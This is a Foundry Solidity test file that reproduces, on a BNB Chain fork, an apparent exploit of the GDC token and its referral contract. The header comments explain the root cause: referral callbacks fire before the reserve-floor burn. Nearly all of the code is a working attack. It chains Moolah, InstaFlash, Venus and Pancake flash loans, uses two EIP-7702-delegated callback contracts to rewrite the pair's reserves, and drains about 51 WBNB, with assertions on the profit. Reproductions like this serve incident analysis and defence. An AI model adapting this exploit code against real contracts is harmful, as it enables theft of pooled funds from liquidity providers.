// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

// GDC (GDCToken / GDCMain) - ~$34,649.58 (51.225527454207054005 WBNB) - mid-sell referral
// callbacks run before the reserve-floor burn, so two EIP-7702 referral accounts can rewrite
// the Pancake V2 reserves the burn then syncs.
// BNB Chain, 2026-11-09.
//
// Run: forge test --contracts src/test/2026-11/GDC_exp.sol --evm-version prague -vvv
//
// Profit: the pair's 51.225608092426095503 WBNB is taken down to 66,000 wei, a loss of
//          51.225608092426029503 WBNB. This reconstruction pays the seller 37.745954125452158109
//          BNB before gas. The exploit tx itself netted +50.008850 BNB after gas. The gap is
//          the 0.25% fee on a 5,000 WBNB flash swap: the fresh uplines have to deposit before
//          onSellRewards will call them, those deposits add WBNB to the pair, and the pin then
//          costs more than the 1,520.106623090084480499 WBNB it cost in the attack. The sell
//          consumes 41,047.699284897040065420 of the EOA's pre-existing GDC.
//
// On-chain references (BNB Smart Chain):
//   attack tx    : 0x1427d8e6f543710413886a1624e08f0b1cff8e62e9aa3e00eb04a61b86c30872 (block 132546183)
//   fork block   : 132546182 (parent of the exploit tx)
//   attacker EOA : 0x09343312e8a2Fd4F8C8EE130a7715587aB21125F
//   GDC token    : 0x39a90d082e19bD2AC30DA6964D3d2FDa50077777
//   GDCMain      : 0x8955Be303f033a837f7C3c407e0B2b3f9bC4fD5C  (depositContract, onSellRewards)
//   GDC/WBNB pair: 0xe3349Ca6AC1656e02B20b8d5a4C095e28255eb0A  (token0 = GDC, token1 = WBNB)
//   on-chain referral A : 0xD804c53A15dFf46cc40A0c17b5c29d1D04472175 delegated to 0xe46b…5873
//   on-chain referral B : 0xF9A71C36CEA96420b16561E82d8093297213e06c delegated to 0xd365…393a
//   The attacker EOA is already bound to that pair of uplines (bindReferral reverts AlreadyBound),
//   so this file does not replay that bytecode. ReferralPush and ReferralSwap below are the same
//   two callbacks in Solidity. A fresh seller binds them with the public bindReferral.
//
// ROOT CAUSE (traced on the parent block; the token is not verified):
//   A sell into the pair is an ordinary transfer of the attacker's own GDC. _transfer:
//     1. Rejects a contract msg.sender (ContractTraderNotAllowed). tx.origin is the EOA,
//        so the attack contract's transferFrom(EOA, pair, amount) is allowed.
//     2. While the pair holds LP_MIN_BALANCE (21,000,000 GDC) the 10% sell cap is latched.
//        41,047 GDC is far under 10% of 21,000,000.
//     3. Forwards 70% into the token, which swaps a slice for BNB and addLiquidityETH's the
//        rest, then syncs. That leaves a known reserve: about 21,028,733 GDC and 1,570.12 WBNB.
//     4. Calls GDCMain.onSellRewards, which getReferrals() the seller and sends each upline a
//        BNB stipend with a raw call, before the pair is settled. The two uplines are EOAs
//        that delegated, twenty minutes earlier, to attacker code. A's fallback pushes its
//        whole WBNB balance into the pair and stores getAmountOut. B's fallback swaps that
//        quoted GDC out to 0xdead. The pair's GDC side falls to just above the gross sell.
//     5. _applyReserveFloorDistribution then pulls the full gross sell out of the pair and
//        syncs. Only after that does _transfer credit 30% to the pair, and it does not sync
//        again. The 30% is therefore excess balance against a near-zero GDC reserve and the
//        WBNB the callback just deposited, and pair.swap pays that excess out as WBNB.
//   The atomic capital (Moolah WBNB+BTCB, InstaFlash route 12 against Venus vWBNB/vBTC cash,
//   and a Venus vBNB borrow of the collateralised BTCB) is borrowed and repaid in the same
//   transaction. It is not the loss. The loss is the pair's own 51.225608092426095503 WBNB.
//
// THE ATTACK. A fresh contract, typed calls, no vm.etch. ReferralPush and ReferralSwap are
//   delegated with signAndAttachDelegation onto two fresh EOAs. The seller binds them through
//   referrals.bindReferral, and each upline deposits 0.1 BNB so effectiveReferralCount qualifies
//   it for onSellRewards (level 1 needs one deposited downline, level 2 needs three). The GDC is
//   the attacker EOA's real balance, moved to that seller by the EOA's own transfer. A receipt
//   arms SellCooldown and SameBlockTrade, so the sell is one block and 31 seconds later.
//   Prague executes the delegations.
//   1. Flash-borrow Moolah's 207,316.511905665561625103 WBNB and 2,745.489118419307925223 BTCB.
//   2. InstaFlash route 12 borrows Venus vWBNB cash and vBTC cash minus the protocol fee that
//      vBTC forwards to 0xca01…c446. Route 9 is Aave and reverts InvalidAmount.
//   3. Flash-swap 5,000 WBNB from the Pancake WBNB/USDT pair. Supply BTCB to vBTC (one BTCB under
//      the parent-block cap, which interest over those two blocks would otherwise exceed) and
//      borrow vBNB cash.
//   4. swapTokensForExactTokens buys the pair down to exactly 21,000,000 GDC, burning the output.
//   5. Fund referral A with the WBNB. Its fallback quotes the amount that leaves the gross sell
//      plus 1000 wei of GDC and pushes that much. Referral B swaps the quote out to 0xdead.
//   6. transferFrom the EOA's 41,047.699284897040065420 GDC into the pair. The callbacks fire
//      inside that transfer. Sweep the unpushed WBNB back, then swap the 30% excess for WBNB.
//   7. Repay the WBNB/USDT flash swap, Venus, InstaFlash and Moolah. Surplus BNB is the pair's reserve.

interface IERC20 {
    function balanceOf(
        address
    ) external view returns (uint256);
    function approve(
        address,
        uint256
    ) external returns (bool);
    function transfer(
        address,
        uint256
    ) external returns (bool);
    function transferFrom(
        address,
        address,
        uint256
    ) external returns (bool);
}

interface IWBNB is IERC20 {
    function deposit() external payable;
    function withdraw(
        uint256
    ) external;
}

interface IGDC {
    function LP_MIN_BALANCE() external view returns (uint256);
    function balanceOf(
        address
    ) external view returns (uint256);
}

interface IMain {
    function effectiveReferralCount(
        address
    ) external view returns (uint256);
}

interface IPair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32);
    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;
    function token0() external view returns (address);
    function token1() external view returns (address);
}

interface IRouter {
    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory);
    function getAmountOut(
        uint256 amountIn,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256);
}

interface IReferrals {
    function bindReferral(
        address referrer
    ) external;
    function rootAddress() external view returns (address);
    function getReferrals(
        address user,
        uint256 depth
    ) external view returns (address[] memory);
}

interface IMoolah {
    function flashLoan(
        address token,
        uint256 assets,
        bytes calldata data
    ) external;
}

interface IFLA {
    function flashLoan(
        address[] calldata tokens,
        uint256[] calldata amounts,
        uint256 route,
        bytes calldata data,
        bytes calldata extra
    ) external;
}

interface IComptroller {
    function enterMarkets(
        address[] calldata
    ) external returns (uint256[] memory);
}

interface IVToken {
    function mint(
        uint256
    ) external returns (uint256);
    function borrow(
        uint256
    ) external returns (uint256);
    function repayBorrow() external payable;
    function redeemUnderlying(
        uint256
    ) external returns (uint256);
    function getCash() external view returns (uint256);
}

contract GDCExploit {
    IWBNB internal constant WBNB = IWBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 internal constant BTCB = IERC20(0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c);
    IGDC internal constant GDC = IGDC(0x39a90d082e19bD2AC30DA6964D3d2FDa50077777);
    IPair internal constant PAIR = IPair(0xe3349Ca6AC1656e02B20b8d5a4C095e28255eb0A);
    IRouter internal constant ROUTER = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IMoolah internal constant MOOLAH = IMoolah(0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C);
    IFLA internal constant FLA = IFLA(0xe620726686B480d955E63b9c7c1f93c2f8c1aCf4);
    IComptroller internal constant COMPTROLLER = IComptroller(0xfD36E2c2a6789Db23113685031d7F16329158384);
    IVToken internal constant VBTC = IVToken(0x882C173bC7Ff3b7786CA16dfeD3DFFfb9Ee7847B);
    IVToken internal constant VBNB = IVToken(0xA07c5b74C9B40447a954e1466938b865b6BBea36);
    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;
    address internal immutable refA;

    // Gross sell. 70% + 30% of this value sum back to it, and it is what the floor burns.
    uint256 internal constant SELL = 41_047.699_284_897_040_065_42 ether;
    // BTCB posted to vBTC. 6,603.411145258658092461 covers the 510,342 BNB borrow at the
    // fork-block oracle (BTC 74,102.54, BNB 676.41234047267875, collateral factor 0.8).
    uint256 internal constant COLLATERAL = 6603.411_145_258_658_092_461 ether;
    // vBTC forwards this much of getCash() out before the flash borrow; the trace amount.
    uint256 internal constant VBTC_FEE = 1_512_403_015_794_404;
    // The qualifying deposits add WBNB to the victim pair, so pinning it to the floor costs
    // more than it did in the attack. This WBNB/USDT flash swap covers that gap and is
    // repaid, with the 0.25% fee, from the WBNB the manipulated pair pays back.
    uint256 internal constant TOP_UP = 5_000 ether;
    IPair internal constant USDT_PAIR = IPair(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
    // InstaFlashAggregator route 12. Route 9 is Aave and reverts InvalidAmount here;
    // route 12 is the one whose liquidity is the Venus vToken cash.
    uint256 internal constant VENUS_ROUTE = 12;

    address internal immutable owner;
    uint256 internal wbnbLoan;
    uint256 internal btcbLoan;

    constructor(
        address refA_
    ) {
        owner = msg.sender;
        refA = refA_;
    }

    receive() external payable {}

    function attack() external {
        require(msg.sender == owner, "not owner");
        wbnbLoan = WBNB.balanceOf(address(MOOLAH));
        MOOLAH.flashLoan(address(WBNB), wbnbLoan, "");
        uint256 leftover = WBNB.balanceOf(address(this));
        if (leftover > 0) WBNB.withdraw(leftover);
        (bool ok,) = payable(owner).call{value: address(this).balance}("");
        require(ok, "payout");
    }

    function onMoolahFlashLoan(
        uint256 assets,
        bytes calldata
    ) external {
        require(msg.sender == address(MOOLAH), "Moolah only");
        if (assets == wbnbLoan && btcbLoan == 0) {
            btcbLoan = BTCB.balanceOf(address(MOOLAH));
            MOOLAH.flashLoan(address(BTCB), btcbLoan, "");
            WBNB.approve(address(MOOLAH), wbnbLoan);
            return;
        }
        _venusFlash();
        BTCB.approve(address(MOOLAH), btcbLoan);
    }

    function _venusFlash() internal {
        address[] memory tokens = new address[](2);
        uint256[] memory amounts = new uint256[](2);
        tokens[0] = address(BTCB);
        tokens[1] = address(WBNB);
        // The sell is a later block, so vBTC has accrued interest and its protocol fee is a
        // few wei above VBTC_FEE. That fee is taken out of cash before the flash transfer.
        amounts[0] = VBTC.getCash() - VBTC_FEE - 0.0001 ether;
        amounts[1] = IVToken(0x6bCa74586218dB34cdB402295796b79663d816e9).getCash();
        FLA.flashLoan(tokens, amounts, VENUS_ROUTE, "", "");
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address,
        bytes calldata
    ) external returns (bool) {
        require(msg.sender == address(FLA), "FLA only");
        _drain();
        // Route 12 keeps the tokens and checks its own balance ("amount-paid-less").
        // Premiums are zero on this route; the principal has to sit on the aggregator.
        for (uint256 i; i < assets.length; i++) {
            require(IERC20(assets[i]).transfer(msg.sender, amounts[i] + premiums[i]), "repay flash");
        }
        return true;
    }

    function _drain() internal {
        // token0 is USDT, token1 is WBNB. The data byte is what makes this a flash swap.
        USDT_PAIR.swap(0, TOP_UP, address(this), hex"01");
    }

    function pancakeCall(
        address,
        uint256,
        uint256 amount1,
        bytes calldata
    ) external {
        require(msg.sender == address(USDT_PAIR), "flash pair");
        _manipulate();
        uint256 repay = amount1 * 10_000 / 9975 + 1;
        require(WBNB.transfer(address(USDT_PAIR), repay), "repay top-up");
    }

    function _manipulate() internal {
        BTCB.approve(address(VBTC), COLLATERAL);
        address[] memory markets = new address[](1);
        markets[0] = address(VBTC);
        COMPTROLLER.enterMarkets(markets);
        // Two blocks of interest push this market onto its supply cap, so post one BTCB less
        // than the parent-block maximum. The vBNB borrow still clears the collateral factor.
        require(VBTC.mint(COLLATERAL - 1 ether) == 0, "mint");
        uint256 borrow = VBNB.getCash();
        require(VBNB.borrow(borrow) == 0, "borrow");
        WBNB.deposit{value: borrow}();

        // Pin the pair on the reserve floor so the sell latches reserveFloorMode there.
        uint256 aboveFloor = GDC.balanceOf(address(PAIR)) - GDC.LP_MIN_BALANCE();
        WBNB.approve(address(ROUTER), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(GDC);
        ROUTER.swapTokensForExactTokens(aboveFloor, WBNB.balanceOf(address(this)), path, DEAD, block.timestamp);

        // Referral A quotes this balance against the live post-tax reserve and pushes only
        // as much as leaves SELL + 1000 wei of GDC. The rest stays on A and is swept later.
        require(WBNB.transfer(refA, WBNB.balanceOf(address(this))), "fund A");

        require(IERC20(address(GDC)).transferFrom(owner, address(PAIR), SELL), "sell");
        // The quote pushes only what the live reserves need. Pull the rest back before repayment.
        ReferralPush(payable(refA)).sweep(address(this));

        (uint112 r0, uint112 r1,) = PAIR.getReserves();
        uint256 excess = GDC.balanceOf(address(PAIR)) - uint256(r0);
        uint256 wbnbOut = _amountOut(excess, uint256(r0), uint256(r1));
        PAIR.swap(0, wbnbOut, address(this), "");

        WBNB.withdraw(borrow);
        VBNB.repayBorrow{value: borrow}();
        require(VBTC.redeemUnderlying(COLLATERAL - 1 ether) == 0, "redeem");
    }

    // Pancake V2, 0.25% fee. Rounds the input up so getAmountOut reaches `out`.
    function _amountIn(
        uint256 out,
        uint256 reserveIn,
        uint256 reserveOut
    ) internal pure returns (uint256) {
        uint256 numerator = reserveIn * out * 10_000;
        uint256 denominator = (reserveOut - out) * 9975;
        return numerator / denominator + 1;
    }

    function _amountOut(
        uint256 amountIn,
        uint256 reserveIn,
        uint256 reserveOut
    ) internal pure returns (uint256) {
        uint256 amountInWithFee = amountIn * 9975;
        return (amountInWithFee * reserveOut) / (reserveIn * 10_000 + amountInWithFee);
    }
}

// Referral A, written out. onSellRewards calls the upline with empty calldata and a BNB stipend
// before the floor burn. This fallback quotes the WBNB it was funded with and pushes that WBNB
// into the pair. It does not swap. get() returns the quote for referral B.
contract ReferralPush {
    IWBNB internal constant WBNB = IWBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IPair internal constant PAIR = IPair(0xe3349Ca6AC1656e02B20b8d5a4C095e28255eb0A);
    IRouter internal constant ROUTER = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    uint256 internal constant SELL = 41_047.699_284_897_040_065_42 ether;

    address internal immutable origin;
    // Immutables live in code, so this is storage slot 0 of the delegated EOA.
    uint256 internal quoted;

    constructor(
        address origin_
    ) {
        origin = origin_;
    }

    function get() external view returns (uint256) {
        return quoted;
    }

    function poke() external {}

    // Whatever the quote does not push still belongs to the exploit, which has the
    // flash loans to repay. tx.origin stays the seller for the whole attack.
    function sweep(
        address to
    ) external {
        require(tx.origin == origin, "origin");
        uint256 bal = WBNB.balanceOf(address(this));
        if (bal > 0) require(WBNB.transfer(to, bal), "sweep");
    }

    // onSellRewards calls this with empty calldata. The quote is a separate external
    // call so each frame stays under the compiler's stack limit and under the 50,000
    // gas stipend. It reads the pair after the 70% tax leg and pushes only the WBNB
    // whose Pancake output leaves SELL + 1000 wei of GDC for the floor burn.
    fallback() external payable {
        require(tx.origin == origin, "origin");
        uint256 pushAmt = this.stageQuote();
        require(WBNB.transfer(address(PAIR), pushAmt), "push");
    }

    function stageQuote() external returns (uint256 pushAmt) {
        require(msg.sender == address(this), "self");
        (uint112 reserveGdc, uint112 reserveWbnb,) = PAIR.getReserves();
        pushAmt = _capped(reserveGdc, reserveWbnb);
        quoted = ROUTER.getAmountOut(pushAmt, reserveWbnb, reserveGdc);
    }

    function _capped(
        uint112 reserveGdc,
        uint112 reserveWbnb
    ) internal view returns (uint256) {
        uint256 bal = WBNB.balanceOf(address(this));
        uint256 need = _amountIn(uint256(reserveGdc) - SELL - 1000, reserveWbnb, reserveGdc);
        return bal < need ? bal : need;
    }

    function _amountIn(
        uint256 out,
        uint256 reserveIn,
        uint256 reserveOut
    ) internal pure returns (uint256) {
        uint256 numerator = reserveIn * out * 10_000;
        uint256 denominator = (reserveOut - out) * 9975;
        return numerator / denominator + 1;
    }
}

// Referral B. Reads A's quote and swaps that much GDC out of the pair to 0xdead, so the floor
// burn that follows syncs a GDC reserve just above the gross sell.
contract ReferralSwap {
    IPair internal constant PAIR = IPair(0xe3349Ca6AC1656e02B20b8d5a4C095e28255eb0A);
    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;

    address internal immutable push;

    constructor(
        address push_
    ) {
        push = push_;
    }

    function poke() external {}

    fallback() external payable {
        uint256 gdcOut = ReferralPush(payable(push)).get();
        PAIR.swap(gdcOut, 0, DEAD, "");
    }
}

contract GDC_exp is Test {
    uint256 internal constant SELL = 41_047.699_284_897_040_065_42 ether;

    address internal constant ATTACKER = 0x09343312e8a2Fd4F8C8EE130a7715587aB21125F;
    IPair internal constant PAIR = IPair(0xe3349Ca6AC1656e02B20b8d5a4C095e28255eb0A);
    IWBNB internal constant WBNB = IWBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IGDC internal constant GDC = IGDC(0x39a90d082e19bD2AC30DA6964D3d2FDa50077777);
    IReferrals internal constant REFS = IReferrals(0xD3Ba7d944544d3416131663919580e039294130E);
    address internal constant MAIN = 0x8955Be303f033a837f7C3c407e0B2b3f9bC4fD5C;

    // minAmount is 0.1 BNB. A downline's deposit is what increments the upline's
    // effectiveReferralCount, which is what onSellRewards checks before it calls them.
    function _deposit(
        address who
    ) internal {
        vm.deal(who, 1 ether);
        vm.prank(who, who);
        (bool ok,) = MAIN.call{value: 0.1 ether}("");
        require(ok, "deposit");
    }

    function setUp() public {
        vm.createSelectFork("bsc", 132_546_182);
    }

    function testExploit() public {
        assertEq(PAIR.token0(), address(GDC), "token0 is GDC");
        assertEq(PAIR.token1(), address(WBNB), "token1 is WBNB");

        address seller = makeAddr("seller");
        (address refA, uint256 refAKey) = makeAddrAndKey("refA");
        (address refB, uint256 refBKey) = makeAddrAndKey("refB");
        uint256 gdcBefore = GDC.balanceOf(ATTACKER);
        uint256 pairWbnbBefore = WBNB.balanceOf(address(PAIR));

        _bindDepositAndDelegate(seller, refA, refAKey, refB, refBKey);

        uint256 eoaBefore = seller.balance;
        _sell(seller, refA);
        _sweep(seller, refA);

        uint256 profit = seller.balance - eoaBefore;
        uint256 pairLoss = pairWbnbBefore - WBNB.balanceOf(address(PAIR));
        emit log_named_decimal_uint("attacker BNB profit", profit, 18);
        emit log_named_decimal_uint("pair WBNB loss", pairLoss, 18);
        emit log_named_decimal_uint("GDC consumed", gdcBefore - GDC.balanceOf(ATTACKER), 18);

        assertEq(gdcBefore - GDC.balanceOf(ATTACKER), SELL, "GDC consumed");
        assertEq(pairLoss, 51.225_608_092_426_029_503 ether, "pair WBNB");
        assertEq(profit, 37.745_954_125_452_158_109 ether, "profit");
    }

    // The attacker EOA is already bound, so bindReferral(attacker) reverts AlreadyBound.
    // A fresh seller may still bind. refB sits under the tree root, refA under refB.
    // Bind first: a deposit also binds, and a second bind reverts AlreadyBound.
    // Deposits happen while these accounts are still plain EOAs. Delegation is attached after.
    function _bindDepositAndDelegate(
        address seller,
        address refA,
        uint256 refAKey,
        address refB,
        uint256 refBKey
    ) internal {
        // rootAddress() is read first: vm.prank applies to the next call only.
        address root = REFS.rootAddress();
        // Level 2 is paid only once that upline has three deposited downlines, which is
        // referral B's count on the parent block. Two extra EOAs plus refA make that count.
        // The seller's own deposit is the one that qualifies refA for level 1.
        address extra1 = makeAddr("extra1");
        address extra2 = makeAddr("extra2");
        vm.prank(refB, refB);
        REFS.bindReferral(root);
        vm.prank(refA, refA);
        REFS.bindReferral(refB);
        vm.prank(extra1, extra1);
        REFS.bindReferral(refB);
        vm.prank(extra2, extra2);
        REFS.bindReferral(refB);
        vm.prank(seller, seller);
        REFS.bindReferral(refA);
        _deposit(refB);
        _deposit(extra1);
        _deposit(extra2);
        _deposit(refA);
        _deposit(seller);
        assertEq(IMain(MAIN).effectiveReferralCount(refA), 1, "refA qualifies for level 1");
        assertEq(IMain(MAIN).effectiveReferralCount(refB), 3, "refB qualifies for level 2");

        // The seller's deposit is a trade. Move past it before the GDC receipt, which arms
        // SellCooldown for 30 seconds and stamps lastTradeBlock. The sell has to be a later
        // block, or transfer into the pair reverts SameBlockTrade.
        vm.warp(block.timestamp + 31);
        vm.roll(block.number + 1);
        vm.prank(ATTACKER, ATTACKER);
        require(IERC20(address(GDC)).transfer(seller, SELL), "move gdc");
        vm.warp(block.timestamp + 31);
        vm.roll(block.number + 1);

        ReferralPush push = new ReferralPush(seller);
        ReferralSwap pull = new ReferralSwap(refA);
        vm.signAndAttachDelegation(address(push), refAKey);
        vm.prank(refA, refA);
        ReferralPush(payable(refA)).poke();
        vm.signAndAttachDelegation(address(pull), refBKey);
        vm.prank(refB, refB);
        ReferralSwap(payable(refB)).poke();

        address[] memory upline = REFS.getReferrals(seller, 2);
        assertEq(upline[0], refA, "level 1 is the push callback");
        assertEq(upline[1], refB, "level 2 is the swap callback");
    }

    function _sell(
        address seller,
        address refA
    ) internal {
        vm.startPrank(seller, seller);
        GDCExploit exploit = new GDCExploit(refA);
        require(IERC20(address(GDC)).approve(address(exploit), type(uint256).max), "approve");
        exploit.attack();
        vm.stopPrank();
    }

    // The callback pushes only what the live reserves need. The rest stays on referral A
    // and is the seller's, so the profit figure includes it.
    function _sweep(
        address seller,
        address refA
    ) internal {
        uint256 idle = WBNB.balanceOf(refA);
        if (idle == 0) return;
        vm.prank(refA, refA);
        require(WBNB.transfer(seller, idle), "sweep A");
        vm.prank(seller, seller);
        WBNB.withdraw(idle);
    }
}
